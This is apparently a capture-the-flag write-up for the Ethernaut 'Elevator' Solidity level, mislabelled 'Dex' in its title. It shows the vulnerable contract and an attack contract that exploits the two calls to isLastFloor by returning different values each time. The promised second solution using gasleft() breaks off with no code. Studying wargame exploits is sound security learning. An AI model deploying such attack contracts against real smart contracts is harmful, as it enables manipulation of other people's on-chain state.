# Ethernaut Dex solution
## Problem
Get to the top of this Elevator
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Explaination
+ So in Elevator contract, we can see that we have no way to get the top, despite how high floor the input.
+ But clearly is the isLastFloor(uint) is the thing we need to care about.
+ It have been call 2 time (not 1). First for confirm this is not top floor, second to reassign the top variable ?
+ Normally when it fail, we dont need to reassign the variable, but here it does. 
+ So I think about the funtion return value different call to achieve the top floor.

## Solution 1
So when we break all the information we need, the solution is really clearly :
1. I made a middle contract to override the isLastFloor()
2. This function return false in the first call, return true from second calls. 
3. Then from this contract I call to the Elevator.goTo(1) to get the top floor!.

Here is the code:
```solidity
contract middleElevator {

  bool firstCall = true;
  function isLastFloor(uint _floor) external returns (bool){

    if(firstCall){
      firstCall = false;
      return false;
    }
    return true;
  }

  function attack(address _victim) public {
    Elevator(_victim).goTo(1);
  }
}
```

## Solution 2
+ In offical website said that, the optimize way than change variable state is using sth like gasleft().
+ So here my solution with it




